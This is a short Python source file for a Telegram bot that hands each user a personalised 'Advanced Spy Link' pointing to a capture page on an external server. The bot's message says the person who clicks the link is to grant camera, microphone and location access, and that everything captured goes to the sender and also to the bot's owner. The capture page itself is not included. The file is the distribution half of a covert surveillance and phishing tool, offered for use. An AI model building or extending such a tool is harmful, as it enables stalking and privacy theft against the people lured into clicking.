import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler

TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")

async def start(update: Update, context):
    user_id = update.effective_user.id
    link = f"{BASE_URL}/capture/{user_id}"
    kb = [[InlineKeyboardButton("🎯 Generate advanced spy link", url=link)]]
    await update.message.reply_text(
        f"**Advanced Spy Link** (max data):\n{link}\n\nClicker must allow: camera, mic, location. Everything sent to you + owner.",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("Bot polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
